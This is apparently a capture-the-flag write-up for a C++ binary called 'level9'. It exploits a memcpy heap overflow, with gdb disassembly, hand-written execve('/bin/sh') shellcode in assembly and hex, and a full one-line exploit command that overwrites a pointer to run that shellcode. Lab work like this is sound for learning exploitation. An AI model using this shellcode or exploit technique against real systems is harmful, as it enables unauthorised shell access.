So level9 will use argv[1] and is written in c++.

A quick look at `info func` in gdb and we can see that memcpy is being used.

With a bit of bruteforce I found 109 is the length of argv[1] to make a segfault.

No system function or anything it will be a ret2libc but in c++.

```
(gdb) disass 0x804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:     push   ebp
   0x0804870f <+1>:     mov    ebp,esp
   0x08048711 <+3>:     sub    esp,0x18
   0x08048714 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:     mov    DWORD PTR [esp],eax
   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
   0x0804871f <+17>:    mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>:    add    edx,0x4
   0x08048725 <+23>:    mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:    mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>:    mov    DWORD PTR [esp],edx
   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:    leave
   0x08048739 <+43>:    ret
End of assembler dump.
```

We'll use a technic close to return-to-shellcode.

https://ctfcookbook.com/docs/pwn/return-to-shellcode/

Let's right a bit of asm:
```asm
xor		ecx, ecx	; ecx = 0
mul		ecx			; eax = 0
push	ecx			; 0x0 on the stack (NULL)
push	0x68732f2f	; "//sh" on the stack
push	0x6e69622f	; "/bin" on the stack
mov		ebx, esp	; ebx points to "/bin/sh"
mov		al, 0xb		; eax = 11, is the number call to execve
int		0x80		; Launch the system call
```

And to why "//sh" ? "//" is interpreted as "/" so nice but why 2 ? Because we need to have the last 2 char of the adress (since it's little endian we need to read the hex value in reverse).

Converted to hex value :

`\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80`

We know we can overflow with `memcpy`, argv[1] is used to be copied.

Let's find where our string is stored.

```
b *0x08048677
r $(python -c "print('a' * 108)")
ni
x/s 0x0804a008
```

> 0x804a008:       "H\210\004\b", 'a' <repeats 108 times>, "H\210\004\b"

Oh YA !!!!

`./level9 $(python -c "print( '\x0c\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'B' * 83 + '\x0c\xa0\x04\x08')")`

